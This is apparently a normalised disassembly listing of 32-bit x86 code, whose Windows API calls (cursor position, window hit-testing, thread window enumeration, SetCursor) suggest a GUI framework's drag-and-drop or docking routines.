lea eax [ ebp - 0xc ]
call sub_44c7c4
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_44ce3c
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_44c7c4
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_44ce3c
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_44bdeb
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46e56c
call sub_403b4c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_44ce3c
sub_44be44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44be6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44bed4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44bc80
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_44bf00
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403518
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_44bf2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403518
xor edx edx
sub_44bf84
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_456d1c
sub_44bfa4
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_456d04
sub_44bfc8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44beb0
mov dl 0x1
mov eax [ r-xdata ]
call sub_425124
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_42a2b0
mov edx eax
mov eax esi
call sub_4252a0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_44c02c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_44c05c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44bed4
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_44c0b8
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403518
pop edi
pop esi
pop ebp
retn 0x4
sub_44c0dc
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_44c100
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_44c0dc
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_44c0dc
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44c1bc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_44c228
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_44c678
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_44b794
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_4550b4
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_4550b4
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4550b4
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403518
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_44c1bc
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_4550b4
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_4550b4
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_44c3c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_4550b4
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4550b4
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_44c404
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_44bc1c
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_44c228
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_418cf8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_4550b4
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_44c3c0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403518
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_453be4
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_44bb8c
sub_44c560
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_418d54
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_418be8
mov edx edi
mov eax [ rw-data ]
call sub_418b9c
jmp r-xdata
sub_44c5c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_44c618
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4045d8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_44b760
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_44c678
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44c618
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_44c6a4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_44c404
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_44c678
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_44c5c0
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_4550b4
mov [ esi ] eax
sub_44c6f4
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_44c5c0
cmp eax 0x1
sbb eax eax
inc eax
sub_44c730
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_453b50
test eax eax
je r-xdata
mov eax esi
call sub_453b50
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_44d160
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_418cf8
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_418d54
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_453b64
mov edi eax
jmp r-xdata
sub_44c7c4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_44c6a4
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_456bd8
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_44c6f4
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_44c6f4
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_44e3f8
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_44c6f4
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c4d4
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_456b94
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_44c730
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403518
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_456cc0
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_456bd8
jmp r-xdata
mov eax [ rw-data ]
call sub_456d34
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c4d4
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_44e3f8
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403518
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403518
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_40810c
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_44ca94
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_44bcc0
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_456bd8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_44c7c4
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_44cc04
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_44cda9
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403518
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403518
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44bfc8
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_44ca94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44beb0
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_4550b4
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_417644
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_44e3cc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_417644
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_44cdc8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403518
mov ebx eax
sub_44ce3c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_44d108
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_44d096
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_44bd08
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4034cc
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
